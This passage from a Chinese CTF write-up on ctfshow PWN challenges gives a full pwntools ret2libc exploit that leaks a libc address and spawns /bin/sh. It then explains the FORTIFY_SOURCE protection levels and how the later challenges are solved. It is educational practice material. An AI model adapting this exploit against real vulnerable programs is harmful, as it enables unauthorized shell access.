</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>                      <span class="c1"># write函数第1个参数：文件描述符1（标准输出）</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>              <span class="c1"># write函数第2个参数：要读取的地址（write的GOT表项）</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>                       <span class="c1"># write函数第3个参数：读取字节数（32位地址占4字节）</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 发送第一个payload，触发write函数泄漏地址</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 接收泄漏的write函数真实地址（4字节，32位）</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>  <span class="c1"># 打印获取到的write地址</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 计算libc基地址及关键函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>  <span class="c1"># libc基地址 = write真实地址 - libc中write的偏移</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>  <span class="c1"># system函数地址 = 基地址 + system在libc中的偏移</span>
</span></span><span class="line"><span class="cl"><span class="c1"># /bin/sh字符串地址 = 基地址 + /bin/sh在libc中的偏移</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 打印计算得到的关键地址（调试用）</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 构造第二个payload：调用system(&#34;/bin/sh&#34;)获取shell</span>
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># 再次填充缓冲区到返回地址</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>            <span class="c1"># 覆盖返回地址为system函数地址</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>             <span class="c1"># system执行后的返回地址（随意填充，不影响功能）</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>              <span class="c1"># system函数的参数：/bin/sh字符串地址</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 发送第二个payload，触发system调用</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 进入交互模式，与获取到的shell进行交互</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>无备注代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;write address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">write_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要注意的点：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 获取关键地址</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># 从程序符号表获取write函数的PLT地址（用于调用）</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># 从程序全局偏移表获取write函数的GOT地址（存储真实地址）</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># 获取存在栈溢出的ctfshow函数地址（用于二次溢出）</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里的地址是可以手写的，但我不建议，AI给的是确切地址，这里我给改了，下次AI写脚本，地址一定不要手动硬写出来，帮AI改一下改成自动获取的，比如上面这样，系统会自动获取地址的，这样比较准确不会出错崩溃。</p>
<p>说实话，给我肯定写不到的，不熟悉编写python远程交互脚本，但我可以读懂，我可以用AI帮我写代码，我就把意愿告诉它，把IDA汇编代码以及跟进的函数复制发给它，附上我的思路，不如已经知道是利用栈溢出漏洞编写ret2libc、知道开启了哪些保护、一步步修改得到的。</p>
<h3 id="pwn_031待定">PWN_031（待定）
</h3><p>题目：开启 ASLR 和 PIE 的情况下，仍可能被利用； <a class="link" href="PWN_031" >PWN_031</a></p>
<p>checksec一下，无栈保护：</p>
<p><img src="/p/ctfshow-pwn-writeup/83.png"
	width="1153"
	height="201"
	srcset="/p/ctfshow-pwn-writeup/83_hu_7ff647734d8a0296.png 480w, /p/ctfshow-pwn-writeup/83_hu_441617b6b4ffee67.png 1024w"
	loading="lazy"
	
		alt="栈溢出"
	
	
		class="gallery-image" 
		data-flex-grow="573"
		data-flex-basis="1376px"
	
></p>
<p>跟进ctfshow函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/84.png"
	width="674"
	height="184"
	srcset="/p/ctfshow-pwn-writeup/84_hu_b9ac56fd6a862ae6.png 480w, /p/ctfshow-pwn-writeup/84_hu_3105db06c121094.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="879px"
	
></p>
<p>发现同样的代码，有溢出，似乎可用上题的exp，不过checksec看到的保护是不一样的，exp肯定不一样了&hellip;.</p>
<p>运行之后莫名其妙，会有报随机化的地址：</p>
<p><img src="/p/ctfshow-pwn-writeup/85.png"
	width="1055"
	height="680"
	srcset="/p/ctfshow-pwn-writeup/85_hu_164fbd871315e02a.png 480w, /p/ctfshow-pwn-writeup/85_hu_4528b5c9989ab6ae.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="372px"
	
></p>
<p>&hellip;..<a class="link" href="https://www.cnblogs.com/Claire-cat/articles/19030339"  target="_blank" rel="noopener"
    >深入分析CTFshow-PWN入门-pwn31的解法与原理 - Claire_cat - 博客园</a></p>
<p>这题和PWN_025差不多，有关栈溢出的知识点，这里先跳&hellip;</p>
<h3 id="fortify缓冲区边界检查"><strong>FORTIFY缓冲区边界检查</strong>
</h3><p><code>FORTIFY_SOURCE</code> 是 GCC 提供的一种轻量级缓冲区溢出保护机制，通过对危险函数（如 <code>strcpy</code>、<code>memcpy</code> 等）进行增强检查，降低缓冲区溢出漏洞的利用风险。它有 3 个级别：<code>_FORTIFY_SOURCE=0</code>（关闭）、<code>_FORTIFY_SOURCE=1</code>（基础保护）、<code>_FORTIFY_SOURCE=2</code>（强化保护），各级别区别如下：</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>级别</th>
          <th>启用条件</th>
          <th>核心检查逻辑</th>
          <th>防护范围</th>
          <th>性能影响</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>默认（无需定义宏）</td>
          <td>无任何检查，使用原始函数</td>
          <td>无</td>
          <td>无</td>
      </tr>
      <tr>
          <td>1</td>
          <td>-D_FORTIFY_SOURCE=1 -O1</td>
          <td>检查 “源长度 &lt; 目标缓冲区长度”（仅限编译期可知）</td>
          <td>部分静态场景</td>
          <td>极小</td>
      </tr>
      <tr>
          <td>2</td>
          <td>-D_FORTIFY_SOURCE=2 -O2</td>
          <td>检查 “操作长度 ≤ 目标缓冲区实际大小”（含运行时）</td>
          <td>静态 + 动态场景，覆盖更多函数</td>
          <td>轻微</td>
      </tr>
  </tbody>
</table></div>
<ul>
<li><code>FORTIFY_SOURCE</code> 仅能防护部分已知的危险函数，无法替代 <code>NX</code>、<code>Stack Canary</code> 等更全面的保护机制。</li>
<li>必须配合优化选项（<code>-O1</code>/<code>-O2</code>）才能生效，否则编译器会忽略该宏定义。</li>
<li>对于动态分配的内存（如 <code>malloc</code> 分配的缓冲区），<code>FORTIFY_SOURCE</code> 无法获取其大小，因此无法防护相关操作（如 <code>memcpy(malloc_buf, src, n)</code>）。</li>
</ul>
<h3 id="pwn_032">PWN_032
</h3><p>题目：FORTIFY_SOURCE=0：</p>
<p>禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。</p>
<p>这题主要是在函数逻辑运行，知道运行的原理就好。</p>
<p>IDA分析main：</p>
<p><img src="/p/ctfshow-pwn-writeup/89.png"
	width="849"
	height="610"
	srcset="/p/ctfshow-pwn-writeup/89_hu_46351ba23fdd4185.png 480w, /p/ctfshow-pwn-writeup/89_hu_90e899f007f35973.png 1024w"
	loading="lazy"
	
		alt="main"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>跟进undefined函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/90.png"
	width="1305"
	height="355"
	srcset="/p/ctfshow-pwn-writeup/90_hu_973dd70d1193f96a.png 480w, /p/ctfshow-pwn-writeup/90_hu_8bf66355b5d6254e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="367"
		data-flex-basis="882px"
	
></p>
<p>可以看到，关键在于成功进入到undefined函数才有机会下一步获得flag：</p>
<p>从main函数出发：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">__gid_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-44h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+Ah] [rbp-3Eh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+15h] [rbp-33h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setresgid</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">logo</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span><span class="c1">//指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span><span class="c1">//指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buf1</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="s">&#34;CTFshowPWN&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">Undefined</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>大致是：起初先打印ctfshow的logo信息（其实一开始那个v3把我搞懵了，其实对解题过程没啥帮助的），在最顶端的__fastcall main已经把一些参数给定义了比如argv数组，第一个参数argv[1]被赋给v4，v4作中介把数值传递给了buf1，之后程序将v4[10]数组内容赋值给buf1[10]，接着通过strcpy函数，把字符串“CTFshowPWN”复制/赋值给buf2，printf打印buf1、buf2的当前的字符串内容，最后fget读取_bss_start的11个字符给buf1，打印buf1和num的信息，最后通过if判断argc是否大于4(默认情况下argc是等于1的，因为argv[0]必定存在，我们输入一个参数，argc就会等于2，依次递推)，大于4就进入undefined函数内</p>
<p>因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc=5 &gt; 4，为什么五个？因为你输入的4个+argc[0] = 5)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行。</p>
<p><img src="/p/ctfshow-pwn-writeup/91.png"
	width="1400"
	height="756"
	srcset="/p/ctfshow-pwn-writeup/91_hu_15b7482435404dc9.png 480w, /p/ctfshow-pwn-writeup/91_hu_ba35ebc958987903.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<h3 id="pwn_033">PWN_033
</h3><p>题目：FORTIFY_SOURCE=1：</p>
<p>启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。 <a class="link" href="PWN_033" >PWN_033</a></p>
<hr>
<p>IDAx64分析：</p>
<p><img src="/p/ctfshow-pwn-writeup/92.png"
	width="890"
	height="575"
	srcset="/p/ctfshow-pwn-writeup/92_hu_b8d7b58369f7ed42.png 480w, /p/ctfshow-pwn-writeup/92_hu_5f64d4fe00dca924.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="371px"
	
></p>
<p>FORTIFY_SOURCE被打开了，代码和PWN_032几乎一样的，memcpy和strcpy这两个函数被替换成了__mencpy_chk和__strcpy__chk安全函数，可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出。</p>
<p>但这不妨碍我们拿flag啊，只要运行./pwnme时输入的字符总长度不超过11就好：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># argv[1] 长度≤10，argv[3] ≤11，总参数≥5 </span>
</span></span><span class="line"><span class="cl">$./pwnme <span class="s2">&#34;short&#34;</span> <span class="s2">&#34;a&#34;</span> <span class="s2">&#34;5&#34;</span> <span class="s2">&#34;d&#34;</span> <span class="s2">&#34;e&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/93.png"
	width="1340"
	height="735"
	srcset="/p/ctfshow-pwn-writeup/93_hu_9f26a9108882b142.png 480w, /p/ctfshow-pwn-writeup/93_hu_c04b5083116f2c7c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="437px"
	
></p>
<h3 id="pwn_034">PWN_034
</h3><p>题目：FORTIFY_SOURCE=2：</p>
<p>启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</p>
<hr>
<p>IDA分析，题目描述也说了该程序包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。
使用ida64反编译的加过略微与前两道题目有所不同，大部分还是一样的，还是把危险函数替换成了安全函数。如下：</p>
<p><img src="/p/ctfshow-pwn-writeup/94.png"
	width="814"
	height="505"
	srcset="/p/ctfshow-pwn-writeup/94_hu_43f6bccc3a9f8aca.png 480w, /p/ctfshow-pwn-writeup/94_hu_7ea7c32cd0d7cfe1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="386px"
	
></p>
<p>大致能看出原函数是什么吧，这里就不多解释了&hellip;</p>
<p># 格式化函数与解题操作说明 <code>__printf__chk</code> 函数与 <code>printf</code> 的区别在于：不能使用 <code>%x$n</code> 不连续地打印，也就是说如果要使用 <code>%3$n</code>，则必须同时使用 <code>%1$n</code> 和 <code>%2$n</code>。在使用 <code>%n</code> 的时候会做一些检查。 这涉及到格式化字符串漏洞，但本题不涉及此漏洞，所以对本道题几乎没有阻碍。后续我们还是通过 SSH 连接后运行文件，输入 4 个长度为 1 的参数，不出意外就能拿到 flag！</p>
<p><img src="/p/ctfshow-pwn-writeup/95.png"
	width="1493"
	height="726"
	srcset="/p/ctfshow-pwn-writeup/95_hu_b3792e7f70688569.png 480w, /p/ctfshow-pwn-writeup/95_hu_abc131af3d5d11c9.png 1024w"
	loading="lazy"
	
